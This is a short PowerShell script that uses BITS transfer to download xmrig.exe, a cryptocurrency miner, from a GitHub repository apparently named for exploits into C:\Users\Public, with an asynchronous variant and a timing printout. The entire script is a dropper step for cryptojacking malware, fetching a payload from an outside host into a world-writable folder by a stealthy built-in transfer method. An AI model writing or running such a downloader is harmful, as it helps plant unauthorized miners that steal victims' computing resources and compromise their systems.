$url = "https://github.com/ExploitGF/mine/raw/master/xmrig.exe"
$output = "C:\Users\Public\xmrig.exe"
$start_time = Get-Date

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous

Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
